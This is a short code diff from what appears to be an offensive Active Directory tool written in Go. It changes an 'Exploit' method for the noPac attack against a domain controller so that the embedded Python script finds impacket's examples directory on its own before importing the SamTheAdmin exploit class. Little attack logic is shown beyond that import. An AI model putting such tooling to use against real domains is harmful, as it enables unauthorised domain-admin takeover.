@@ -48,8 +48,19 @@ func (n *NoPacManager) Exploit(dcIP, domain, user, pass, hash, targetUser string
 
 	fmt.Printf("[*] Exploiting noPac on %s (target: %s)...\n", dcIP, targetUser)
 
-	script := `import sys, os
-sys.path.insert(0, '/usr/share/doc/python3-impacket/examples')
+	script := `import sys, os, subprocess
+
+# Auto-detect impacket examples path
+paths = [
+    '/usr/share/doc/python3-impacket/examples',
+    '/usr/share/doc/impacket/examples',
+    '/opt/impacket/examples',
+    '/usr/local/lib/python3/dist-packages/impacket/examples',
+]
+for p in paths:
+    if os.path.isdir(p):
+        sys.path.insert(0, p)
+        break
 
 from impacket.examples.sam_the_admin import SamTheAdmin
 
